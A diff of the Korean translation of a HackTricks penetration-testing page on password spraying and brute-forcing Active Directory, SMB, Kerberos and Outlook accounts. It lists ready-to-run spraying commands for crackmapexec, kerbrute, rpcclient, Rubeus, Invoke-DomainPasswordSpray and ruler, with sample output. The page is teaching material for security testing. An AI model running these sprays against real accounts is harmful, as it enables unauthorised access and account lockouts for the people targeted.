@@ -1,18 +1,18 @@
-# Password Spraying / Brute Force
+# 비밀번호 스프레이 / 무차별 대입 공격
 
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## **Password Spraying**
+## **비밀번호 스프레이**
 
-여러 **유효한 사용자 이름**을 찾은 후, 발견된 각 사용자에 대해 가장 **일반적인 비밀번호**를 시도할 수 있습니다 (환경의 비밀번호 정책을 염두에 두세요).\
-기본적으로 **최소** **비밀번호** **길이**는 **7**입니다.
+여러 **유효한 사용자 이름**을 찾은 후, 발견된 각 사용자에 대해 가장 **일반적인 비밀번호**를 시도할 수 있습니다(환경의 비밀번호 정책을 염두에 두세요).\
+**기본적으로** **최소** **비밀번호** **길이**는 **7**입니다.
 
 일반적인 사용자 이름 목록도 유용할 수 있습니다: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-여러 개의 잘못된 비밀번호를 시도하면 **일부 계정이 잠길 수 있습니다** (기본적으로 10개 이상).
+여러 개의 잘못된 비밀번호를 시도하면 **일부 계정이 잠길 수 있습니다**(기본적으로 10개 이상).
 
-### Get password policy
+### 비밀번호 정책 가져오기
 
 사용자 자격 증명이나 도메인 사용자로서의 쉘이 있는 경우, **다음 명령어로 비밀번호 정책을 가져올 수 있습니다**:
 ```bash
@@ -31,9 +31,9 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Linux(또는 모든)에서의 악용
+### Exploitation from Linux (or all)
 
-- **crackmapexec** 사용:
+- Using **crackmapexec:**
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
@@ -56,7 +56,7 @@ spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-- **Metasploit**의 `scanner/smb/smb_login` 모듈을 사용하여:
+- `scanner/smb/smb_login` 모듈을 사용하여 **Metasploit**:
 
 ![](<../../images/image (745).png>)
 
@@ -67,7 +67,7 @@ for u in $(cat users.txt); do
 rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
-#### Windows에서
+#### From Windows
 
 - [Rubeus](https://github.com/Zer1t0/Rubeus) 브루트 모듈이 포함된 버전:
 ```bash
@@ -77,8 +77,8 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)를 사용하여 (기본적으로 도메인에서 사용자를 생성할 수 있으며 도메인에서 비밀번호 정책을 가져와 이에 따라 시도를 제한합니다):
-```powershell
+- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)를 사용하여 (기본적으로 도메인에서 사용자를 생성할 수 있으며, 도메인에서 비밀번호 정책을 가져와 이에 따라 시도를 제한합니다):
+```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 - [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) 사용하여
@@ -99,7 +99,7 @@ Outlook에 대한 p**assword spraying**을 위한 여러 도구가 있습니다.
 - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) 사용 (Powershell)
 - [MailSniper](https://github.com/dafthack/MailSniper) 사용 (Powershell)
 
-이 도구 중 하나를 사용하려면 사용자 목록과 비밀번호 / 비밀번호의 작은 목록이 필요합니다.
+이 도구를 사용하려면 사용자 목록과 비밀번호 / 비밀번호의 작은 목록이 필요합니다.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
